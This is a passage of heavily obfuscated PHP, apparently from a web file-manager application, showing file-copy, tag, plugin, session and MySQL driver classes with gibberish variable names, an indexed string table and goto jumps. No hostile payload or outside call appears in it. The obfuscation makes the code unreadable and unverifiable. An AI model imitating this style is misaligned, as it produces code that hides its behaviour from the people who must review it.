$this->fileHistory($Â­ÍÍ¸è, $ìÖ¬®²€[$µ†­ó‰¡[477]], $ìÖ¬®²€[$µ†­ó‰¡[76]]); if ($ëüÜøöĞ) { $üĞÕûÑÍ[$µ†­ó‰¡[575]][] = $ìÖ¬®²€[$µ†­ó‰¡[477]]; } continue; } else { if ($çØßûÑ == REPEAT_RENAME) { $ìÖ¬®²€[$µ†­ó‰¡[32]] = $this->fileNameAutoCache($İ“²ÊşË, $ìÖ¬®²€[$µ†­ó‰¡[32]], $çØßûÑ, !1); } } } } if (!$ìÖ¬®²€[$µ†­ó‰¡[419]] && $ìÖ¬®²€[$µ†­ó‰¡[477]] == 0) { continue; } if (!$ìÖ¬®²€[$µ†­ó‰¡[419]] && $ìÖ¬®²€[$µ†­ó‰¡[477]]) { $üĞÕûÑÍ[$µ†­ó‰¡[575]][] = $ìÖ¬®²€[$µ†­ó‰¡[477]]; } $êÊôÅÓæ[] = $this->_makeItemData($ìÖ¬®²€, $ÓˆãŒª, $ìÖ¬®²€[$µ†­ó‰¡[32]]); } unset($ìÖ¬®²€); if (!empty($êÊôÅÓæ)) { $this->addAll($êÊôÅÓæ); $this->_childrenListSelect($İ“²ÊşË); } $ÌÇ¥€€† = $this->_childrenList($İ“²ÊşË); $ÌÇ¥€€† = array_to_keyvalue($ÌÇ¥€€†, $µ†­ó‰¡[32]); foreach ($Â‹‰¨ÅÃ as $ìÖ¬®²€) { $Â­ÍÍ¸è = $ÌÇ¥€€†[$ìÖ¬®²€[$µ†­ó‰¡[32]]]; $šû°‰” = $Â­ÍÍ¸è[$µ†­ó‰¡[411]]; $this->_copyApplyMeta($Â­ÍÍ¸è, $üĞÕûÑÍ); if ($ìÖ¬®²€[$µ†­ó‰¡[33]] == $µ†­ó‰¡[75]) { $ìÖ¬®²€[$µ†­ó‰¡[84]] = $î±³‡¥‚->getPathInner($ìÖ¬®²€[$µ†­ó‰¡[84]]); $this->_copyChildTo($î±³‡¥‚, $ìÖ¬®²€[$µ†­ó‰¡[84]], $šû°‰”, $çØßûÑ, $üĞÕûÑÍ, $ìùïûæû); } } } private function _addFiles($•œš«Ó, $Ã³¶û¯÷, $Í…¬à›Œ) { $èåãÈ¦‰ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ã³¶û¯÷ || count($Ã³¶û¯÷) == 0) { return array(); } $ëÁ¡¢¥ı = array(); foreach ($Ã³¶û¯÷ as &$È•ßû) { Hook::trigger($èåãÈ¦‰[616], $È•ßû); $È•ßû[$èåãÈ¦‰[84]] = $•œš«Ó->getPathInner($È•ßû[$èåãÈ¦‰[84]]); $èÅÊÌŞÒ = $•œš«Ó->hashSimple($È•ßû[$èåãÈ¦‰[84]]); $˜³îÃ©Ú = $•œš«Ó->hashMd5($È•ßû[$èåãÈ¦‰[84]]); if (strlen($˜³îÃ©Ú) > 10 && !isset($ëÁ¡¢¥ı[$˜³îÃ©Ú])) { $ëÁ¡¢¥ı[$˜³îÃ©Ú] = array(); } $È•ßû[$èåãÈ¦‰[177]] = $èÅÊÌŞÒ; $È•ßû[$èåãÈ¦‰[176]] = $˜³îÃ©Ú; $ëÁ¡¢¥ı[$˜³îÃ©Ú][] =& $È•ßû; if (count($ëÁ¡¢¥ı[$˜³îÃ©Ú]) > 1) { $È•ßû[$èåãÈ¦‰[615]] = !0; } Hook::trigger($èåãÈ¦‰[617], $È•ßû); } unset($È•ßû); $ÒáúÊÌï = array($èåãÈ¦‰[176] => array($èåãÈ¦‰[7], array_keys($ëÁ¡¢¥ı))); $‹ë½÷ŠĞ = Model($èåãÈ¦‰[618]); $‘ß„Ã–ü = $‹ë½÷ŠĞ->where($ÒáúÊÌï)->select(); $‘ß„Ã–ü = $‘ß„Ã–ü ? $‘ß„Ã–ü : array(); foreach ($‘ß„Ã–ü as $Õò´ŠĞ¹) { if (!isset($ëÁ¡¢¥ı[$Õò´ŠĞ¹[$èåãÈ¦‰[176]]])) { continue; } $–‰ÑÛÆ‹ = $ëÁ¡¢¥ı[$Õò´ŠĞ¹[$èåãÈ¦‰[176]]]; foreach ($–‰ÑÛÆ‹ as &$È•ßû) { $È•ßû[$èåãÈ¦‰[477]] = $Õò´ŠĞ¹[$èåãÈ¦‰[477]]; $È•ßû[$èåãÈ¦‰[615]] = !0; } unset($È•ßû); } $‘Á²Í„ç = array(); foreach ($Ã³¶û¯÷ as $şàŸÂÌ·) { Hook::trigger($èåãÈ¦‰[619], $şàŸÂÌ·); if (isset($şàŸÂÌ·[$èåãÈ¦‰[615]]) && $şàŸÂÌ·[$èåãÈ¦‰[615]]) { Hook::trigger($èåãÈ¦‰[620], $şàŸÂÌ·); continue; } $Š²¥Š©Ş = $•œš«Ó->getPathInner($şàŸÂÌ·[$èåãÈ¦‰[84]]); $´…ˆ´„• = $‹ë½÷ŠĞ->addFileMake($Š²¥Š©Ş, $şàŸÂÌ·[$èåãÈ¦‰[76]], $şàŸÂÌ·[$èåãÈ¦‰[177]], $şàŸÂÌ·[$èåãÈ¦‰[176]], $şàŸÂÌ·[$èåãÈ¦‰[32]], $Í…¬à›Œ); Hook::trigger($èåãÈ¦‰[620], $şàŸÂÌ·); if (!is_array($´…ˆ´„•)) { continue; } $‘Á²Í„ç[] = $´…ˆ´„•; } $‹ë½÷ŠĞ->addAll($‘Á²Í„ç); $ÒáúÊÌï = array($èåãÈ¦‰[176] => array($èåãÈ¦‰[7], array_keys($ëÁ¡¢¥ı))); $‘ß„Ã–ü = $‹ë½÷ŠĞ->where($ÒáúÊÌï)->select(); $‘ß„Ã–ü = $‘ß„Ã–ü ? $‘ß„Ã–ü : array(); foreach ($‘ß„Ã–ü as $Õò´ŠĞ¹) { if (!isset($ëÁ¡¢¥ı[$Õò´ŠĞ¹[$èåãÈ¦‰[176]]])) { continue; } $Îå’Áô =& $ëÁ¡¢¥ı[$Õò´ŠĞ¹[$èåãÈ¦‰[176]]]; foreach ($Îå’Áô as &$È•ßû) { $È•ßû[$èåãÈ¦‰[477]] = $Õò´ŠĞ¹[$èåãÈ¦‰[477]]; } unset($È•ßû); } $‹¨¶û¦§ = array(); foreach ($Ã³¶û¯÷ as $ıòÖåšù) { $‹¨¶û¦§[$ıòÖåšù[$èåãÈ¦‰[32]]] = $ıòÖåšù; } return $‹¨¶û¦§; } } define($_SERVER[ĞÆÏ¡Îª][621], $_SERVER[ĞÆÏ¡Îª][622]); goto D‘ÍĞÃ‚”ç; eõù‹½ŸÑ¶: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($©¦²–—õ) { $•¨è¬‘‡ =& $_SERVER[ĞÆÏ¡Îª]; return array($•¨è¬‘‡[1928] => array($©¦²–—õ[0], $•¨è¬‘‡[1929]), $•¨è¬‘‡[1930] => array($©¦²–—õ[0], $•¨è¬‘‡[1931])); } protected function get($ƒÛ„ıĞ„) { $æ±¢î =& $_SERVER[ĞÆÏ¡Îª]; $÷ûÚê Ê = Model($æ±¢î[531])->metaGet($ƒÛ„ıĞ„, $æ±¢î[1932]); $ë®Âä”Ÿ = json_decode($÷ûÚê Ê, !0); return $ë®Âä”Ÿ ? $ë®Âä”Ÿ : array($æ±¢î[1933] => $æ±¢î[88], $æ±¢î[378] => array()); } protected function set($‹üÕ‘±ó, $¢¸÷ÅõÜ) { $´÷î† =& $_SERVER[ĞÆÏ¡Îª]; $¢¸÷ÅõÜ = $¢¸÷ÅõÜ ? $¢¸÷ÅõÜ : array($´÷î†[1933] => $´÷î†[88], $´÷î†[378] => array()); return Model($´÷î†[531])->metaSet($‹üÕ‘±ó, $´÷î†[1932], json_encode($¢¸÷ÅõÜ)); } protected function getByTagID($îĞÊ°›é, $’˜¼ö´Ö) { $ï÷¸¤Ä• =& $_SERVER[ĞÆÏ¡Îª]; if (!$îĞÊ°›é || !$’˜¼ö´Ö) { return !1; } if (!Model($ï÷¸¤Ä•[531])->getInfoSimple($îĞÊ°›é)) { return !1; } $œ¶ÑÍ¤ı = $this->get($îĞÊ°›é); if (!$œ¶ÑÍ¤ı || !isset($œ¶ÑÍ¤ı[$ï÷¸¤Ä•[378]])) { return !1; } $¹†Æšà… = array_find_by_field($œ¶ÑÍ¤ı[$ï÷¸¤Ä•[378]], $ï÷¸¤Ä•[407], $’˜¼ö´Ö); return is_array($¹†Æšà…) ? $¹†Æšà… : !1; } public function listSource($ĞÃ“Ö£÷, $‹ûÌÓÀú) { $ÀÓºêà =& $_SERVER[ĞÆÏ¡Îª]; if ($‹ûÌÓÀú && !is_array($‹ûÌÓÀú)) { $‹ûÌÓÀú = array($‹ûÌÓÀú); } $è‡§ª˜» = $this->listData($ĞÃ“Ö£÷); $¸µ’ÀÌ = array(); foreach ($è‡§ª˜» as $İíÎÌ÷ï) { $˜Ì±ØØŠ = $İíÎÌ÷ï[$ÀÓºêà[84]]; if (!$˜Ì±ØØŠ) { continue; } if (!isset($¸µ’ÀÌ[$˜Ì±ØØŠ])) { $¸µ’ÀÌ[$˜Ì±ØØŠ] = array(); } $¸µ’ÀÌ[$˜Ì±ØØŠ][] = $İíÎÌ÷ï[$ÀÓºêà[435]]; } $¹Ä’€Ê = array(); foreach ($¸µ’ÀÌ as $Ø€¡ùÃ => $Ó¾²†‡) { $ú”ô¶úğ = !0; if (!$‹ûÌÓÀú) { $¹Ä’€Ê[] = $Ø€¡ùÃ; continue; } foreach ($‹ûÌÓÀú as $–ï©Œ€±) { if (!in_array($–ï©Œ€±, $Ó¾²†‡)) { $ú”ô¶úğ = !1; break; } } if ($ú”ô¶úğ) { $¹Ä’€Ê[] = $Ø€¡ùÃ; } } if (!$¹Ä’€Ê) { return array(); } $ú¨ò§¬À = array($ÀÓºêà[426] => array($ÀÓºêà[427], $¹Ä’€Ê), $ÀÓºêà[514] => $ĞÃ“Ö£÷, $ÀÓºêà[420] => SourceModel::TYPE_GROUP); $åÎµ¦æå = Model($ÀÓºêà[1318])->listSource($ú¨ò§¬À); if (!$åÎµ¦æå || count($¹Ä’€Ê) == $åÎµ¦æå[$ÀÓºêà[375]][$ÀÓºêà[376]]) { return $åÎµ¦æå; } $÷êŸ„½ı = array(); $ÊŸòéå = array_to_keyvalue($åÎµ¦æå[$ÀÓºêà[82]], $ÀÓºêà[12], $ÀÓºêà[411]); $æ—øì¡ = array_to_keyvalue($åÎµ¦æå[$ÀÓºêà[83]], $ÀÓºêà[12], $ÀÓºêà[411]); $ùç¨°Ÿª = array_merge($æ—øì¡, $ÊŸòéå); foreach ($¹Ä’€Ê as $˜Ì±ØØŠ) { if (!in_array($˜Ì±ØØŠ, $ùç¨°Ÿª)) { $÷êŸ„½ı[] = $˜Ì±ØØŠ; } } if ($÷êŸ„½ı) { $this->removeBySource($ĞÃ“Ö£÷, $÷êŸ„½ı); } return $åÎµ¦æå; } protected function listData($Üéªà¤·) { $¨¢Áºşæ =& $_SERVER[ĞÆÏ¡Îª]; $²¾æœ±Ï = array($¨¢Áºşæ[1638] => 0, $¨¢Áºşæ[493] => array($¨¢Áºşæ[1934], 0), $¨¢Áºşæ[431] => $¨¢Áºşæ[1935] . $Üéªà¤·); $êŞ×Âêí = $¨¢Áºşæ[1936]; $ÇŞÅ¢„§ = $this->field($êŞ×Âêí)->where($²¾æœ±Ï)->order($¨¢Áºşæ[1937])->select(); return $ÇŞÅ¢„§ ? $ÇŞÅ¢„§ : array(); } protected function addToTag($¯Û¼—Ñ, $©–…¼¬, $§ğÒ¢úî) { $ÇÁšó¿® =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->getByTagID($¯Û¼—Ñ, $§ğÒ¢úî) || !$©–…¼¬) { return !1; } if (!Model($ÇÁšó¿®[820])->pathInfo($©–…¼¬)) { return !1; } $Æ™ÎÇç = array($ÇÁšó¿®[1638] => 0, $ÇÁšó¿®[493] => $§ğÒ¢úî, $ÇÁšó¿®[430] => $©–…¼¬, $ÇÁšó¿®[431] => $ÇÁšó¿®[1938] . $¯Û¼—Ñ, $ÇÁšó¿®[429] => $ÇÁšó¿®[12], $ÇÁšó¿®[1823] => 0); if ($this->where($Æ™ÎÇç)->find()) { return !1; } return $this->add($Æ™ÎÇç); } protected function removeFromTag($€Å®ÎªÑ, $«‡ÆßÏå, $şÒñ×€¡) { $¦ÊÓÓË =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->getByTagID($€Å®ÎªÑ, $şÒñ×€¡) || !$«‡ÆßÏå) { return !1; } if (is_array($«‡ÆßÏå)) { $«‡ÆßÏå = array($¦ÊÓÓË[7], $«‡ÆßÏå); } $õÄà×Íº = array($¦ÊÓÓË[1638] => 0, $¦ÊÓÓË[493] => $şÒñ×€¡, $¦ÊÓÓË[431] => $¦ÊÓÓË[1938] . $€Å®ÎªÑ, $¦ÊÓÓË[430] => $«‡ÆßÏå); return $this->where($õÄà×Íº)->delete(); } protected function removeByTag($ğÊï€è©, $¬¼³¡Ç·) { $”ê««Ø¿ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->getByTagID($ğÊï€è©, $¬¼³¡Ç·)) { return !1; } $šÎ†† ¢ = array($”ê««Ø¿[1638] => 0, $”ê««Ø¿[493] => $¬¼³¡Ç·, $”ê««Ø¿[431] => $”ê««Ø¿[1938] . $ğÊï€è©); return $this->where($šÎ†† ¢)->delete(); } protected function removeBySource($İ¶¦ö–¬, $Ãíˆû) { $Ïâ‹‡–È =& $_SERVER[ĞÆÏ¡Îª]; if (!$İ¶¦ö–¬ || !$Ãíˆû) { return !1; } if (is_array($Ãíˆû)) { $Ãíˆû = array($Ïâ‹‡–È[7], $Ãíˆû); } $Ï¼¾ÛØ = array($Ïâ‹‡–È[1638] => 0, $Ïâ‹‡–È[430] => $Ãíˆû, $Ïâ‹‡–È[493] => array($Ïâ‹‡–È[1005], 0), $Ïâ‹‡–È[431] => $Ïâ‹‡–È[1938] . $İ¶¦ö–¬); return $this->where($Ï¼¾ÛØ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x70\x6c\x75\147\151\x6e\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\145", "\163\164\x61\164\x75\x73", "\162\x65\x67\151\x65\x73\x74", "\143\x6f\x6e\146\x69\147"); public function loadList($ÛÁİêĞ½ = false) { $¤Û«Üˆ = array_to_keyvalue($this->listData(), $_SERVER[ĞÆÏ¡Îª][32]); if ($ÛÁİêĞ½) { return $¤Û«Üˆ[$ÛÁİêĞ½]; } return $¤Û«Üˆ; } public function init() { $„ïÛß‘Ï =& $_SERVER[ĞÆÏ¡Îª]; Hook::trigger($„ïÛß‘Ï[1939]); $÷Á³‘Ä = $this->loadPluginList(); foreach ($÷Á³‘Ä as $–ÃÃŠéÍ => $¡Óµ‘ ß) { $Ÿöô¢ù = $this->appAllow($–ÃÃŠéÍ, $¡Óµ‘ ß); if (!$Ÿöô¢ù) { continue; } foreach ($¡Óµ‘ ß[$„ïÛß‘Ï[1940]] as $ø£õ—Ç => $‡˜÷†éò) { Hook::bind($ø£õ—Ç, $‡˜÷†éò); } } Hook::trigger($„ïÛß‘Ï[1941]); Hook::trigger(ACTION); } public function appAllow($ÏŞ‡‡Äâ, $ö®”ì²ã, $×˜Œ¾İ¡ = true) { $è±›Ì• =& $_SERVER[ĞÆÏ¡Îª]; $¬Äª£Ë« = PLUGIN_DIR . $ÏŞ‡‡Äâ . $è±›Ì•[1942]; if (!is_array($ö®”ì²ã) || !is_array($ö®”ì²ã[$è±›Ì•[1940]]) || $ö®”ì²ã[$è±›Ì•[745]] != 1 || !is_file($¬Äª£Ë«)) { return !1; } if ($GLOBALS[$è±›Ì•[512]] == 1) { if ($GLOBALS[$è±›Ì•[6]][$è±›Ì•[1943]] || !$GLOBALS[$è±›Ì•[6]][$è±›Ì•[1944]]) { return !0; } $†µ§«¥Ä = explode($è±›Ì•[50], strtolower($GLOBALS[$è±›Ì•[6]][$è±›Ì•[1944]])); return in_array(strtolower($ÏŞ‡‡Äâ), $†µ§«¥Ä) ? !1 : !0; } if ($×˜Œ¾İ¡ && !Action($è±›Ì•[1945])->checkAuth($ÏŞ‡‡Äâ)) { return !1; } return !0; } public function unInstall($şà¦é­ê) { $½¿ó“‹ =& $_SERVER[ĞÆÏ¡Îª]; $€îË²òÃ = $this->loadList($şà¦é­ê); if (file_exists(PLUGIN_DIR . $şà¦é­ê)) { Hook::apply($şà¦é­ê . $½¿ó“‹[1946]); } $this->remove($€îË²òÃ[$½¿ó“‹[407]]); } public function changeStatus($Ø†¸ˆÜ, $ØËâÁ³È) { $‘—´ÔŸ =& $_SERVER[ĞÆÏ¡Îª]; $±Óˆ˜Ø = $this->loadList($Ø†¸ˆÜ); if ($ØËâÁ³È) { Hook::apply($Ø†¸ˆÜ . $‘—´ÔŸ[1947]); } $this->update($±Óˆ˜Ø[$‘—´ÔŸ[407]], array($‘—´ÔŸ[1948] => $ØËâÁ³È)); } public function appRegist($ŠÊö¢ıü, $»„¥£¨Ò) { $ıâ»ŸÆª =& $_SERVER[ĞÆÏ¡Îª]; $Ú¤Âœ• = $this->loadList($ŠÊö¢ıü); if ($Ú¤Âœ•) { $this->update($Ú¤Âœ•[$ıâ»ŸÆª[407]], array($ıâ»ŸÆª[1940] => $»„¥£¨Ò)); } else { $·Å¯Á¯° = array($ıâ»ŸÆª[32] => $ŠÊö¢ıü, $ıâ»ŸÆª[1940] => $»„¥£¨Ò, $ıâ»ŸÆª[745] => 0, $ıâ»ŸÆª[6] => $this->getConfigDefault($ŠÊö¢ıü)); $this->insert($·Å¯Á¯°); } } public function getConfigDefault($•³é‰­‚) { $ìì¾³ùå =& $_SERVER[ĞÆÏ¡Îª]; $áíÇíÜÉ = array(); $¾£ı÷Òä = $this->getPackageJson($•³é‰­‚); if (!$¾£ı÷Òä && is_array($¾£ı÷Òä[$ìì¾³ùå[1949]])) { return $áíÇíÜÉ; } foreach ($¾£ı÷Òä[$ìì¾³ùå[1949]] as $ƒÕîâõ× => $¢ì‰Ö’‡) { if (!isset($¢ì‰Ö’‡[$ìì¾³ùå[383]]) || isset($áíÇíÜÉ[$ƒÕîâõ×])) { continue; } $áíÇíÜÉ[$ƒÕîâõ×] = $¢ì‰Ö’‡[$ìì¾³ùå[383]]; } return $áíÇíÜÉ; } public function getPackageJson($ôØç›¤Ô) { return Hook::apply($ôØç›¤Ô . $_SERVER[ĞÆÏ¡Îª][1950]); } public function getConfig($¨ìı‚µ, $¡Ûå¹¡• = false) { $í‘ò¤£ =& $_SERVER[ĞÆÏ¡Îª]; $Æ—‘üõ¾ = array(); $óéıÒœø = $this->loadList($¨ìı‚µ); if ($óéıÒœø && is_array($óéıÒœø[$í‘ò¤£[6]])) { $Æ—‘üõ¾ = $óéıÒœø[$í‘ò¤£[6]]; } if (!$Æ—‘üõ¾ || $¡Ûå¹¡•) { $Æ—‘üõ¾ = $this->getConfigDefault($¨ìı‚µ); } return $Æ—‘üõ¾; } public function setConfig($ªÖõÊ’ù, $¢ÔÚ™ø = false) { $®ñ°”‡£ =& $_SERVER[ĞÆÏ¡Îª]; $ƒÜ¢íØñ = $this->loadList($ªÖõÊ’ù); if (!$ƒÜ¢íØñ) { return !1; } $˜¡ÚóÉÓ = $ƒÜ¢íØñ[$®ñ°”‡£[6]]; if ($¢ÔÚ™ø == !1) { $˜¡ÚóÉÓ = array(); $¢ÔÚ™ø = $this->getConfigDefault($ªÖõÊ’ù); } foreach ($¢ÔÚ™ø as $šüâÕ´å => $âÑïŞÍ¥) { $˜¡ÚóÉÓ[$šüâÕ´å] = is_string($âÑïŞÍ¥) ? trim($âÑïŞÍ¥) : $âÑïŞÍ¥; } $this->update($ƒÜ¢íØñ[$®ñ°”‡£[407]], array($®ñ°”‡£[6] => $˜¡ÚóÉÓ)); } public function viewList() { $á‚ÁóÊ‚ =& $_SERVER[ĞÆÏ¡Îª]; $ßªÃÚæÙ = $this->loadList(); $this->pluginScan($ßªÃÚæÙ); $ßªÃÚæÙ = $this->loadPluginList(); $é¢¼¬ = array(); foreach ($ßªÃÚæÙ as $´¾ş’ğ¬ => $¶í¿³Íõ) { unset($¶í¿³Íõ[$á‚ÁóÊ‚[1940]], $¶í¿³Íõ[$á‚ÁóÊ‚[6]]); $ÖÓÅ ¯¨ = PLUGIN_DIR . $¶í¿³Íõ[$á‚ÁóÊ‚[32]] . $á‚ÁóÊ‚[1942]; if (!is_file($ÖÓÅ ¯¨)) { continue; } $½Œè‘½ = Hook::apply($¶í¿³Íõ[$á‚ÁóÊ‚[32]] . $á‚ÁóÊ‚[1950]); if (is_array($½Œè‘½)) { $é¢¼¬[$´¾ş’ğ¬] = array_merge($¶í¿³Íõ, $½Œè‘½); } } return $é¢¼¬; } private function loadPluginList() { $ç³ƒ¯ê® =& $_SERVER[ĞÆÏ¡Îª]; $úìä‹¿½ = $this->loadList(); if (strtolower(MOD) == $ç³ƒ¯ê®[1951]) { return $úìä‹¿½; } $ÍÙËØ¡ = Hook::trigger($ç³ƒ¯ê®[1952], $úìä‹¿½); if ($úìä‹¿½ && !$ÍÙËØ¡) { die; } return $ÍÙËØ¡ ? $ÍÙËØ¡ : $úìä‹¿½; } private function pluginScan($òş°“¬¨) { $°¡›ÚÀ“ =& $_SERVER[ĞÆÏ¡Îª]; recursion_dir(PLUGIN_DIR, $‡ÓØå±İ, $ëñëßÈÁ, 0); foreach ($‡ÓØå±İ as $´éßìæğ) { $ŞïÇ¨’„ = get_path_this($´éßìæğ); if (isset($òş°“¬¨[$ŞïÇ¨’„]) || !file_exists($´éßìæğ . $°¡›ÚÀ“[1953]) || !file_exists($´éßìæğ . $°¡›ÚÀ“[1942])) { continue; } Hook::apply($ŞïÇ¨’„ . $°¡›ÚÀ“[1947]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\137\163\145\163\x73\151\157\156"; public function get($ÕïáÂ¿) { $š´×âÀÌ =& $_SERVER[ĞÆÏ¡Îª]; $ì÷ÍÍŠè = $this->where(array($š´×âÀÌ[1954] => $ÕïáÂ¿))->find(); if (!is_array($ì÷ÍÍŠè)) { return !1; } return $ì÷ÍÍŠè[$š´×âÀÌ[750]]; } public function set($ê»‰¾İî, $×½§ªå‹, $§¸á¸¥ñ = 3600) { $¡Ä€ì’¢ =& $_SERVER[ĞÆÏ¡Îª]; $áŞêÔ½ = array($¡Ä€ì’¢[1954] => $ê»‰¾İî, $¡Ä€ì’¢[1858] => $×½§ªå‹, $¡Ä€ì’¢[1955] => $§¸á¸¥ñ + time()); if (Session::get($¡Ä€ì’¢[1956])) { $áŞêÔ½[$¡Ä€ì’¢[1647]] = Session::get($¡Ä€ì’¢[1956]); } else { $áŞêÔ½[$¡Ä€ì’¢[1647]] = 0; } if ($this->get($ê»‰¾İî)) { return $this->where(array($¡Ä€ì’¢[1954] => $ê»‰¾İî))->save($áŞêÔ½); } else { return $this->add($áŞêÔ½, array(), !0); } } public function remove($¬Ï©ŠÇÌ) { return $this->where(array($_SERVER[ĞÆÏ¡Îª][1954] => $¬Ï©ŠÇÌ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ĞÆÏ¡Îª][1957] . time())->delete(); } } goto a‰Ó˜‘ñƒÂ; bÃé©ôŞ¢õ: define($_SERVER[ĞÆÏ¡Îª][249], 3); define($_SERVER[ĞÆÏ¡Îª][250], 1); define($_SERVER[ĞÆÏ¡Îª][251], 0); goto B¨…æ“; BŸ´è±œª: class DbMysql extends Db { public function __construct($Ñª¿Ï¤ù = '') { $ş®•‡‘… =& $_SERVER[ĞÆÏ¡Îª]; if (!extension_loaded($ş®•‡‘…[799])) { think_exception(think_lang($ş®•‡‘…[14]) . $ş®•‡‘…[876]); } if (!empty($Ñª¿Ï¤ù)) { $this->config = $Ñª¿Ï¤ù; if (empty($this->config[$ş®•‡‘…[17]])) { $this->config[$ş®•‡‘…[17]] = $ş®•‡‘…[12]; } } } public function connect($¬³›¬‘© = '', $À¶¹±šª = 0, $½¶öÉËÖ = false) { $Àé›ª“… =& $_SERVER[ĞÆÏ¡Îª]; if (!isset($this->linkID[$À¶¹±šª])) { if (empty($¬³›¬‘©)) { $¬³›¬‘© = $this->config; } $¬œ‡”Ã = $¬³›¬‘©[$Àé›ª“…[877]] . ($¬³›¬‘©[$Àé›ª“…[878]] ? "\x3a{$¬³›¬‘©[$Àé›ª“…[878]]}" : $Àé›ª“…[12]); $øæÕÌ¹– = !empty($¬³›¬‘©[$Àé›ª“…[17]][$Àé›ª“…[18]]) ? $¬³›¬‘©[$Àé›ª“…[17]][$Àé›ª“…[18]] : $this->pconnect; if ($øæÕÌ¹–) { $this->linkID[$À¶¹±šª] = mysql_pconnect($¬œ‡”Ã, $¬³›¬‘©[$Àé›ª“…[879]], $¬³›¬‘©[$Àé›ª“…[880]], 131072); } else { $this->linkID[$À¶¹±šª] = mysql_connect($¬œ‡”Ã, $¬³›¬‘©[$Àé›ª“…[879]], $¬³›¬‘©[$Àé›ª“…[880]], !0, 131072); } if (!$this->linkID[$À¶¹±šª] || !empty($¬³›¬‘©[$Àé›ª“…[21]]) && !mysql_select_db($¬³›¬‘©[$Àé›ª“…[21]], $this->linkID[$À¶¹±šª])) { think_exception(mysql_error()); } $ŒºÂÄ¬Û = mysql_get_server_info($this->linkID[$À¶¹±šª]); mysql_query($Àé›ª“…[881] . think_config($Àé›ª“…[882]) . $Àé›ª“…[58], $this->linkID[$À¶¹±šª]); if ($ŒºÂÄ¬Û > $Àé›ª“…[883]) { mysql_query($Àé›ª“…[884], $this->linkID[$À¶¹±šª]); } $this->connected = !0; if (1 != think_config($Àé›ª“…[22])) { unset($this->config); } } return $this->linkID[$À¶¹±šª]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ğ÷ôÖ§Œ) { $óéÖÌë =& $_SERVER[ĞÆÏ¡Îª]; if (0 === stripos($ğ÷ôÖ§Œ, $óéÖÌë[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ÷ôÖ§Œ; if ($this->queryID) { $this->free(); } think_action_status($óéÖÌë[23], 1); think_status($óéÖÌë[24]); $this->queryID = mysql_query($ğ÷ôÖ§Œ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Àãº¤­¼) { $ìÛ¥Êû¦ =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Àãº¤­¼; if ($this->queryID) { $this->free(); } think_action_status($ìÛ¥Êû¦[25], 1); think_status($ìÛ¥Êû¦[24]); $øş÷Î²Ş = mysql_query($Àãº¤­¼, $this->_linkID); $this->debug(); if (!1 === $øş÷Î²Ş) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ĞÆÏ¡Îª][885], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $÷ÍÀ¿Ë¾ = mysql_query($_SERVER[ĞÆÏ¡Îª][886], $this->_linkID); $this->transTimes = 0; if (!$÷ÍÀ¿Ë¾) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $”èš¯êÎ = mysql_query($_SERVER[ĞÆÏ¡Îª][887], $this->_linkID); $this->transTimes = 0; if (!$”èš¯êÎ) { $this->error(); return !1; } } return !0; } private function getAll() { $˜¹æåÁŸ = array(); if ($this->numRows > 0) { while ($ù„¾´áÕ = mysql_fetch_assoc($this->queryID)) { $˜¹æåÁŸ[] = $ù„¾´áÕ; } mysql_data_seek($this->queryID, 0); } return $˜¹æåÁŸ; } public function getFields($é®ä¤®à) { $¾áƒÇÇ =& $_SERVER[ĞÆÏ¡Îª]; $ßö‹µùˆ = $this->query($¾áƒÇÇ[888] . $this->parseKey($é®ä¤®à)); $Ç¸èî’Î = array(); if ($ßö‹µùˆ) { foreach ($ßö‹µùˆ as $ºŒ³ùƒ => $«œğ˜ªß) { $Ç¸èî’Î[$«œğ˜ªß[$¾áƒÇÇ[31]]] = array($¾áƒÇÇ[32] => $«œğ˜ªß[$¾áƒÇÇ[31]], $¾áƒÇÇ[33] => $«œğ˜ªß[$¾áƒÇÇ[34]], $¾áƒÇÇ[35] => (bool) (strtoupper($«œğ˜ªß[$¾áƒÇÇ[36]]) === $¾áƒÇÇ[889]), $¾áƒÇÇ[37] => $«œğ˜ªß[$¾áƒÇÇ[38]], $¾áƒÇÇ[39] => strtolower($«œğ˜ªß[$¾áƒÇÇ[40]]) == $¾áƒÇÇ[41], $¾áƒÇÇ[42] => strtolower($«œğ˜ªß[$¾áƒÇÇ[43]]) == $¾áƒÇÇ[44]); } } return $Ç¸èî’Î; } public function getTables($¨°³×­Û = '') { $êĞ´¾ç  =& $_SERVER[ĞÆÏ¡Îª]; if (!empty($¨°³×­Û)) { $”ß‰‹üœ = $êĞ´¾ç [890] . $¨°³×­Û . $êĞ´¾ç [891]; } else { $”ß‰‹üœ = $êĞ´¾ç [892]; } $’ÂÌÄé˜ = $this->query($”ß‰‹üœ); $·É°Ø¼ò = array(); foreach ($’ÂÌÄé˜ as $‹—ÔŠ‹¥ => $ÑÀïÑÖ£) { $·É°Ø¼ò[$‹—ÔŠ‹¥] = current($ÑÀïÑÖ£); } return $·É°Ø¼ò; } public function replace($ş§è«™, $×Š©úÄ = array()) { $¾µãéå„ =& $_SERVER[ĞÆÏ¡Îª]; foreach ($ş§è«™ as $î’ñ‘½ù => $‡ŸÊ´ÏÈ) { $Ø—¸Äƒà = 